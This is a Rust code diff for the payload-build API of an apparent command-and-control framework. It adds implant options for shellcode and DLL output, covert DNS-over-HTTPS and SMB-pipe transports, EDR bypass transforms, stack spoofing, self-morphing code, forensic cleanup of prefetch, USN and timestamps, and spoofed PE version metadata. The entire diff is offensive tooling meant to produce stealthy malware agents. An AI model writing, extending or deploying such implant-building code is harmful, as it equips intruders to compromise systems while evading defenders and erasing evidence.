@@ -17,29 +17,94 @@ use crate::state::AppState;
 pub struct BuildRequest {
     pub os: String,
     pub arch: String,
+    /// Output format: "exe" (default), "shellcode", or "dll".
+    #[serde(default = "default_format")]
+    pub format: String,
+    /// Transport: "tls" (default), "http", "doh", "ssh", "smb".
+    #[serde(default = "default_transport")]
+    pub transport: String,
     pub features: BuildFeatures,
     pub host: String,
     pub port: u16,
     pub pin: String,
     pub key: String,
     pub output_dir: Option<String>,
-    /// Optional hex-encoded 64-bit seed for reproducible builds.  When set,
-    /// both `OPTIMIZER_STUB_SEED` and `CODE_TRANSFORM_SEED` are pinned to
-    /// this value so the output binary is bit-for-bit identical across builds.
-    /// When absent, the builder generates fresh random seeds, producing a
-    /// unique binary every time.
+    /// Sleep interval in milliseconds (default 5000).
+    #[serde(default = "default_sleep_ms")]
+    pub sleep_ms: u64,
+    /// Jitter percentage 0-100 (default 20).
+    #[serde(default = "default_jitter")]
+    pub jitter: u8,
+    /// Optional kill date as "YYYY-MM-DD". The agent shuts down after this date.
+    #[serde(default)]
+    pub kill_date: Option<String>,
+    /// Optional hex-encoded 64-bit seed for reproducible builds.
     #[serde(default)]
     pub seed: Option<String>,
+    /// Optional PE version info (Windows only).
+    #[serde(default)]
+    pub version_info: Option<PeVersionInfo>,
+    /// Optional manifest preset (Windows only): "service", "elevated", "standard".
+    #[serde(default)]
+    pub manifest_preset: Option<String>,
+}
+
+fn default_format() -> String { "exe".into() }
+fn default_transport() -> String { "tls".into() }
+fn default_sleep_ms() -> u64 { 5000 }
+fn default_jitter() -> u8 { 20 }
+
+#[derive(Deserialize, Debug, Clone)]
+pub struct PeVersionInfo {
+    pub file_version: Option<String>,
+    pub file_description: Option<String>,
+    pub company_name: Option<String>,
+    pub product_name: Option<String>,
+    pub original_filename: Option<String>,
 }
 
 #[derive(Deserialize, Debug, Clone)]
 pub struct BuildFeatures {
+    #[serde(default)]
     pub persistence: bool,
-    /// Enables `direct-syscalls` in the agent (maps to the `direct-syscalls` Cargo feature).
+    /// Enables `direct-syscalls` in the agent.
+    #[serde(default)]
     pub direct_syscalls: bool,
     /// Enables `remote-assist` in the agent (screen capture + input simulation).
+    #[serde(default)]
     pub remote_assist: bool,
+    #[serde(default)]
     pub stealth: bool,
+    /// Enables `network-discovery` feature (ARP/TCP scan/DNS).
+    #[serde(default)]
+    pub network_discovery: bool,
+    /// Enables `forensic-cleanup` feature (prefetch, USN, timestamps).
+    #[serde(default)]
+    pub forensic_cleanup: bool,
+    /// Enables self re-encoding (.text section morphing).
+    #[serde(default)]
+    pub self_reencode: bool,
+    /// Enables HTTP CDN relay transport.
+    #[serde(default)]
+    pub http_transport: bool,
+    /// Enables DNS-over-HTTPS transport.
+    #[serde(default)]
+    pub doh_transport: bool,
+    /// Enables SSH tunnel transport.
+    #[serde(default)]
+    pub ssh_transport: bool,
+    /// Enables SMB named pipe transport.
+    #[serde(default)]
+    pub smb_pipe_transport: bool,
+    /// Enables EDR bypass transform engine.
+    #[serde(default)]
+    pub evasion_transform: bool,
+    /// Enables P2P mesh networking.
+    #[serde(default)]
+    pub p2p: bool,
+    /// Enables stack spoofing.
+    #[serde(default)]
+    pub stack_spoof: bool,
 }
 
 #[derive(Serialize)]
@@ -122,13 +187,15 @@ pub fn init_build_queue(workers: usize, build_dir: PathBuf, retention_days: u32)
                     req,
                     operator,
                     server_build_dir,
-                    state_ref: _,
+                    state_ref,
                 } = job;
 
                 let res = tokio::task::spawn_blocking({
                     let map2 = map_clone.clone();
                     let jid = job_id.clone();
-                    move || execute_build_safely(jid, req, operator, server_build_dir, map2)
+                    let agent_secret = state_ref.config.agent_shared_secret.clone();
+                    let module_key = state_ref.config.module_aes_key.clone();
+                    move || execute_build_safely(jid, req, operator, server_build_dir, map2, agent_secret, module_key)
                 })
                 .await
                 // P2-15: propagate JoinError instead of panicking.
@@ -237,7 +304,7 @@ pub async fn handle_build(
 
     // P1-14: Reject build targets that point to private/internal IPs (SSRF).
     // Pin the resolved IP to prevent DNS rebinding attacks (V3 fix).
-    let pinned_ip = match resolve_and_validate_host(&req.host).await {
+    let pinned_ip = match resolve_and_validate_host(&req.host, state.config.allow_local_builds).await {
         Ok(ip) => ip,
         Err(e) => {
             state.audit.record_simple(
@@ -400,6 +467,8 @@ fn execute_build_safely(
     _operator: String,
     base_build_dir: PathBuf,
     map_rc: Arc<Mutex<HashMap<String, JobState>>>,
+    agent_shared_secret: String,
+    module_aes_key: Option<String>,
 ) -> anyhow::Result<String> {
     let append_log = |line: &str| {
         if let Ok(mut m) = map_rc.lock() {
@@ -423,7 +492,7 @@ fn execute_build_safely(
 
     copy_workspace_for_build(workspace, tmp_path)?;
 
-    let profile = build_profile_from_request(&job_id, &req)?;
+    let profile = build_profile_from_request(&job_id, &req, &agent_shared_secret, module_aes_key)?;
 
     append_log("Executing cargo build within sandbox limits...");
 
@@ -433,6 +502,8 @@ fn execute_build_safely(
         .arg("--release")
         .arg("-p")
         .arg("builder")
+        .arg("--bin")
+        .arg("orchestra-builder")
         .arg("--")
         .arg("build")
         .arg("temp_profile");
@@ -563,6 +634,8 @@ fn execute_build_safely(
 fn build_profile_from_request(
     job_id: &str,
     req: &BuildRequest,
+    agent_shared_secret: &str,
+    module_aes_key: Option<String>,
 ) -> anyhow::Result<builder::config::PayloadConfig> {
     validate_cert_pin(&req.pin)?;
     validate_target_os_arch(&req.os, &req.arch)?;
@@ -581,6 +654,59 @@ fn build_profile_from_request(
     if req.features.stealth {
         features.push("stealth".to_string());
     }
+    if req.features.network_discovery {
+        features.push("network-discovery".to_string());
+    }
+    if req.features.forensic_cleanup {
+        features.push("forensic-cleanup".to_string());
+    }
+    if req.features.self_reencode {
+        features.push("self-reencode".to_string());
+    }
+    if req.features.http_transport {
+        features.push("http-transport".to_string());
+    }
+    if req.features.doh_transport {
+        features.push("doh-transport".to_string());
+    }
+    if req.features.ssh_transport {
+        features.push("ssh-transport".to_string());
+    }
+    if req.features.smb_pipe_transport {
+        features.push("smb-pipe-transport".to_string());
+    }
+    if req.features.evasion_transform {
+        features.push("evasion-transform".to_string());
+    }
+    if req.features.p2p {
+        features.push("p2p".to_string());
+    }
+    if req.features.stack_spoof {
+        features.push("stack-spoof".to_string());
+    }
+    // Auto-enable transport feature based on transport field
+    match req.transport.as_str() {
+        "http" if !req.features.http_transport => { features.push("http-transport".to_string()); }
+        "doh" if !req.features.doh_transport => { features.push("doh-transport".to_string()); }
+        "ssh" if !req.features.ssh_transport => { features.push("ssh-transport".to_string()); }
+        "smb" if !req.features.smb_pipe_transport => { features.push("smb-pipe-transport".to_string()); }
+        _ => {}
+    }
+
+    let version_info = req.version_info.as_ref().map(|vi| {
+        builder::config::VersionInfoConfig {
+            file_version: vi.file_version.clone(),
+            product_version: None,
+            file_description: vi.file_description.clone(),
+            file_version_name: None,
+            original_filename: vi.original_filename.clone(),
+            product_name: vi.product_name.clone(),
+            company_name: vi.company_name.clone(),
+            legal_copyright: None,
+            comments: None,
+            clone_from: None,
+        }
+    });
 
     Ok(builder::config::PayloadConfig {
         target_os: req.os.clone(),
@@ -588,28 +714,21 @@ fn build_profile_from_request(
         c2_address: c2_addr,
         encryption_key: req.key.clone(),
         hmac_key: None,
-        // Derive a separate PSK from the operator key so the C2 shared secret
-        // and the encryption key are never the same value (M-36 fix).
-        c_server_secret: Some({
-            use sha2::{Digest, Sha256};
-            let mut hasher = Sha256::new();
-            hasher.update(common::hkdf_info::C2_PSK_DERIVATION);
-            hasher.update(req.key.as_bytes());
-            format!("{:x}", hasher.finalize())
-        }),
+        // Use the server's actual agent_shared_secret as the PSK so the agent
+        // authenticates with the same secret the server expects.
+        c_server_secret: Some(agent_shared_secret.to_string()),
         server_cert_fingerprint: Some(req.pin.clone()),
         features,
         output_name: Some(job_id.to_string()),
         package: "agent".to_string(),
         bin_name: Some("agent-standalone".to_string()),
-        // Artifact kit fields default to off for server-initiated builds.
-        // Operators configure these in their local profiles if needed.
-        version_info: None,
+        version_info,
         icon_path: None,
-        manifest_preset: None,
+        manifest_preset: req.manifest_preset.clone(),
         custom_manifest: None,
         strip_signature: true,
         strip_debug: true,
+        module_aes_key,
     })
 }
 
@@ -677,13 +796,14 @@ fn validate_seed(seed_hex: &str) -> anyhow::Result<()> {
 /// for the agent's C2 address.  Operators who need DNS-based failover
 /// should use a dedicated C2 protocol that supports multiple endpoints
 /// rather than relying on DNS round-robin.
-async fn resolve_and_validate_host(host: &str) -> anyhow::Result<IpAddr> {
+async fn resolve_and_validate_host(host: &str, allow_local: bool) -> anyhow::Result<IpAddr> {
     // Try to parse as an IP address first.
     if let Ok(ip) = host.parse::<IpAddr>() {
-        if is_private_or_reserved(&ip) {
+        if !allow_local && is_private_or_reserved(&ip) {
             anyhow::bail!(
                 "host '{}' is a private/reserved IP address; \
-                 build targets must use public infrastructure addresses",
+                 build targets must use public infrastructure addresses \
+                 (set allow_local_builds = true in config for local testing)",
                 host
             );
         }
@@ -706,10 +826,11 @@ async fn resolve_and_validate_host(host: &str) -> anyhow::Result<IpAddr> {
     }
 
     for ip in &addrs {
-        if is_private_or_reserved(ip) {
+        if !allow_local && is_private_or_reserved(ip) {
             anyhow::bail!(
                 "host '{}' resolves to private/reserved IP {}; \
-                 build targets must use public infrastructure addresses",
+                 build targets must use public infrastructure addresses \
+                 (set allow_local_builds = true in config for local testing)",
                 host,
                 ip
             );
@@ -914,7 +1035,7 @@ mod tests {
 
     #[test]
     fn server_build_profile_targets_outbound_agent_with_pin() {
-        let profile = build_profile_from_request("job123", &request()).unwrap();
+        let profile = build_profile_from_request("job123", &request(), "test_secret", None).unwrap();
         assert_eq!(profile.package, "agent");
         assert_eq!(profile.bin_name.as_deref(), Some("agent-standalone"));
         assert_eq!(profile.output_name.as_deref(), Some("job123"));
